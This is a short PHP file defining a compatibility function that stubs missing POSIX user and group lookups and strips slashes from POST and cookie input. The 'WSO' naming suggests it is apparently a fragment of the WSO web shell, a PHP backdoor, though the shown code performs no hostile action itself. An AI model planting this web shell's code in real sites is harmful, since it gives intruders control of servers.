<?php
function WSOCompat() {
    if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) {
        function posix_getpwuid($p) {return false;}
    }
    if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) {
        function posix_getgrgid($p) {return false;}
    }
    
    if(get_magic_quotes_gpc()) {
        function WSOstripslashes($array) {
            return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
        }
        $_POST = WSOstripslashes($_POST);
        $_COOKIE = WSOstripslashes($_COOKIE);
    }
}